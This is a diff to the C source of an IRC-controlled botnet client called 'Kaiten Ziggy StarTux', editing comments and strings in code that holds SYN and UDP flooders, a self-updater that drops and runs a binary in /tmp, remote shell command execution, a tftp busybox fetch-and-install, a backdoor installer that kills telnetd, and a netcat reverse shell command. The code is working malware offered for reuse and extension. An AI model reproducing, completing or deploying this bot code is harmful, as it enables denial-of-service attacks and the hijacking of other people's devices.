@@ -47,9 +47,9 @@
  *       SPOOFS <subnet>               = Changes spoofing to a subnet          *
  *       DISABLE                       = Disables all packeting from this bot  *
  *       ENABLE                        = Enables all packeting from this bot   *
- *       KILL                          = Kills the knight                      *
+ *       KILL                          = Kills Ziggy                           *
  *       GET <http address> <save as>  = Downloads a file off the web          *
- *       VERSION                       = Requests version of knight            *
+ *       VERSION                       = Requests version of bot               *
  *       KILLALL                       = Kills all current packeting           *
  *       HELP                          = Displays this                         *
  *       IRC <command>                 = Sends this command to the server      *
@@ -297,7 +297,7 @@ void getspoofs(int sock, char *sender, int argc, char **argv) {
         else Send(sock,"NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d\n",sender,((u_char*)&a)[3],((u_char*)&a)[2],((u_char*)&a)[1],((u_char*)&a)[0],((u_char*)&b)[3],((u_char*)&b)[2],((u_char*)&b)[1],((u_char*)&b)[0]);
 }
 void version(int sock, char *sender, int argc, char **argv) {
-        Send(sock,"NOTICE %s :Kaiten Ziggy Redo\n",sender);
+        Send(sock,"NOTICE %s :Kaiten Ziggy StarTux (2.2)\n",sender);
 }
 void nickc(int sock, char *sender, int argc, char **argv) {
         if (argc != 1) {
@@ -310,6 +310,7 @@ void nickc(int sock, char *sender, int argc, char **argv) {
         }
         Send(sock,"NICK %s\n",argv[1]);
 }
+// Brought back these features from the dead... now kaiten has auth again.
 void disable(int sock, char *sender, int argc, char **argv) {
         if (argc != 1) {
                 Send(sock,"NOTICE %s :DISABLE <pass>\n",sender);
@@ -476,6 +477,7 @@ void udp(int sock, char *sender, int argc, char **argv) {
                 i++;
         }
 }
+// Removed TSUNAMI because it never ever works as thus was a waste of bits
 void pan(int sock, char *sender, int argc, char **argv) {
         struct send_tcp send_tcp;
         struct pseudo_header pseudo_header;
@@ -591,7 +593,7 @@ void unknown(int sock, char *sender, int argc, char **argv) {
         close(fd);
 	exit(0);
 }
-// Shamelessly ripped from the Knight varient (and improved)
+// Shamelessly ripped from the Knight varient (and improved!)
 void update(int sock, char *sender, int argc, char **argv) {
 	int sock2,i,d;
 	struct sockaddr_in server;
@@ -690,7 +692,7 @@ void update(int sock, char *sender, int argc, char **argv) {
 /* You may have to play around with this a bit if your zombies don't have killall or sleep try this:
 * //sprintf(buf,"(chmod 755 /tmp/.o;kill -9 %d; kill -9 %d;trap '' 1 2; /tmp/.o &) > /dev/null",actualparent,parent,execfile);
 */ Otherwise run GETBB first, and than this will work just fine:
-		sprintf(buf,"export PATH=/var/bin:/usr/sbin:/bin:/usr/bin:/sbin;chmod +x /tmp/.o; trap '' 1;sh -c 'killall kaiten*;killall kt*;killall .o;sleep 5;trap "" 1;/tmp/.o '&");
+		sprintf(buf,"export PATH=/var/bin:/usr/sbin:/bin:/usr/bin:/sbin;export HOME=/tmp;chmod +x /tmp/.o; trap '' 1;sh -c 'killall kaiten*;killall kt*;killall .o;sleep 5;trap "" 1;/tmp/.o '&");
 	}
 	close(sock);
 	close(sock2);
@@ -699,7 +701,7 @@ void update(int sock, char *sender, int argc, char **argv) {
 	exit(0);
 }
 
-
+// Switch servers. Not a security hole if you configure your IRCD properly!
 void move(int sock, char *sender, int argc, char **argv) {
         if (argc < 1) {
                 Send(sock,"NOTICE %s :MOVE <server>\n",sender);
@@ -790,7 +792,7 @@ void hackpkg(int sock, char *sender, int argc, char **argv) {
 
 void help(int sock, char *sender, int argc, char **argv) {
         if (mfork(sender) != 0) return;
-	Send(sock,"#@#@#@#@# :ZIGGY StarTux (Kaiten Reborn)                    = ShellzRuS 2016, In loving memory of David Bowie. #@#@#@#@#@",sender); sleep(1);
+	Send(sock,"#@#@#@#@# :ZIGGY StarTux (Kaiten Reborn)                    = Shellz 2016, In loving memory of David Bowie. #@#@#@#@#@",sender); sleep(1);
         Send(sock,"NOTICE %s :PAN <target> <port> <secs>                       = An advanced syn flooder that will kill most network drivers\n",sender); sleep(1);
         Send(sock,"NOTICE %s :UDP <target> <port> <secs>                       = A udp flooder\n",sender); sleep(1);
         Send(sock,"NOTICE %s :UNKNOWN <target> <secs>                          = Another non-spoof udp flooder\n",sender); sleep(1);
@@ -826,6 +828,7 @@ void help(int sock, char *sender, int argc, char **argv) {
 	Send(sock,"NOTICE %s :GETSSH <http:server/dropbearmulti>               = D/l, install, configure and start dropbear on port 30022.\n",sender); sleep(1);
 	exit(0);
 }
+// Killall packeting from the DOS functions
 void killall(int sock, char *sender, int argc, char **argv) {
         unsigned long i;
         for (i=0;i<numpids;i++) {
@@ -835,7 +838,7 @@ void killall(int sock, char *sender, int argc, char **argv) {
                 }
         }
 }
-
+// Kill the bot
 void killd(int sock, char *sender, int argc, char **argv) {
 	char buf[1024]={0};
 	if (disabled == 1) return;
@@ -844,11 +847,11 @@ void killd(int sock, char *sender, int argc, char **argv) {
 	exit(0);
 
 }
+// If you add your own functions, be sure to add them here (See below [**])
 struct FMessages { char *cmd; void (* func)(int,char *,int,char **); } flooders[] = {
         { "PAN", pan },
         { "UDP", udp },
 	{ "UNKNOWN", unknown },
-
         { "NICK", nickc },
         { "SERVER", move },
 	{ "GETSPOOFS", getspoofs },
@@ -898,14 +901,14 @@ void _PRIVMSG(int sock, char *sender, char *str) {
                         exit(0);
                 }
 
-
+//[**] This is the exception, because these are all part of the privmsg function
 		// SHD (daemonize sh command)
 		if (!strncmp(message,"SHD ",4)) {
 			char buf[1024];
 			FILE *command;
 			if (mfork(sender) != 0) return;
 			memset(buf,0,1024);
-			sprintf(buf,"export HOME=/tmp;export;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;trap '' 1 2; sh -c '%s'&",message+4);
+			sprintf(buf,"export HOME=/tmp;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;trap '' 1 2; sh -c '%s'&",message+4);
 			command=popen(buf,"r");
 			while(!feof(command)) {
 				memset(buf,0,1024);
@@ -934,13 +937,13 @@ void _PRIVMSG(int sock, char *sender, char *str) {
                         pclose(command);
                         exit(0);
 	}
-// GETBB (this installs a better busybox, via tftp. This func, like the rest, has a dependency that we would like eliminate (in this case tftp). We really want to have the c program handle as much of thse custom funcs as possile Although this could be changed to use the GET function I guess.
+// GETBB (this installs a better busybox, via tftp. This func, like the rest, has a dependency that we would like eliminate (in this case tftp).
 		if (!strncmp(message,"GETBB ",6)) {
 			char buf[1024];
 			FILE *command;
 			if (mfork(sender) != 0) return;
 			memset(buf,0,1024);
-			sprintf(buf,"export fileGet=busybox-mips;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;cd /var;(([ ! -e /var/\"$fileGet\" ] || [ ! -s /var/\"$fileGet\" ]) && tftp -g -r \"$fileGet\" %s && chmod +x \"$fileGet\" && ./\"$fileGet\" mkdir bin && ./\"$fileGet\" --install -s /var/bin && ls -l \"$fileGet\" || echo It appears we already have /var/\"$fileGet\")",message+6);
+			sprintf(buf,"export fileGet=busybox;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;cd /var;(([ ! -e /var/\"$fileGet\" ] || [ ! -s /var/\"$fileGet\" ]) && tftp -g -r \"$fileGet\" %s && chmod +x \"$fileGet\" && ./\"$fileGet\" mkdir bin && ./\"$fileGet\" --install -s /var/bin && ls -l \"$fileGet\" || echo It appears we already have /var/\"$fileGet\")",message+6);
 			command=popen(buf,"r");
 			while(!feof(command)) {
 				memset(buf,0,1024);
@@ -1011,7 +1014,7 @@ void _PRIVMSG(int sock, char *sender, char *str) {
                         exit(0);
                 }
 
-// LOCKUP <http:server/backdoor>  (This kills telnet and installs my backdoor binary, which is aes encrypted. This is prob something else that would be cool to have built in to elimiate the dependency
+// LOCKUP <http:server/backdoor>  (This kills telnetd and installs your custom backdoor binary, which should have some kind of auth. This is prob something else that would be cool to have built in to elimiate the dependency
 
 		if (!strncmp(message,"LOCKUP ",7)) {
                         char buf[1024];
@@ -1030,7 +1033,7 @@ void _PRIVMSG(int sock, char *sender, char *str) {
                         exit(0);
                 }
 
-// !* RSHELL server.com 4444 (reverse shell via nc. We need a built in reverese shell functiomn to eliminiate this dependency)
+// !* RSHELL server.com 4444 (reverse shell via nc. We need a built in reverese shell functiomn to eliminiate this dependency too. All in good time.)
 		if (!strncmp(message,"RSHELL ",6)) {
                         char buf[1024];
                         FILE *command;
@@ -1048,7 +1051,7 @@ void _PRIVMSG(int sock, char *sender, char *str) {
                         exit(0);
                 }
 
-//SCAN (calls the nmap wrapper script. Eventaully this dependency will be removed.)
+//SCAN (calls the nmap wrapper script. Eventaully this dependency will be removed too.)
 		if (!strncmp(message,"SCAN ",5)) {
                         char buf[1024];
                         FILE *command;
@@ -1066,7 +1069,7 @@ void _PRIVMSG(int sock, char *sender, char *str) {
                         exit(0);
                 }
 
-// !* BASH <cmd>
+// !* BASH <cmd> (Assumes bash lives in /var/bin)
 		if (!strncmp(message,"BASH ",5)) {
                         char buf[1024];
                         FILE *command;
